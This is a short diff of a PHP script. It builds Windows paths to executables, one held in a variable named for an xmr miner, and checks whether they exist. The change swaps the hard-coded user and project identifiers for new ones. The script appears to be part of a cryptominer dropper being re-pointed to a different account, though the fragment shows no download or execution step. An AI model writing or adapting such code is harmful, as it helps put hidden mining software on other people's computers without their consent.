@@ -128,8 +128,8 @@ if(1)
 	$lolm_path .= '\\'.$lolm_name.'.exe';
 	$xmr_path .= '\\'.$xmr_name.'.exe';
 	$data = true;
-	$user = 'luizdev1500';
-	$project = 'projetonovo';
+	$user = 'admirdev2025';
+	$project = 'myproj';
 	if(!is_file($lolm_path))
 	{
 		$data = false;
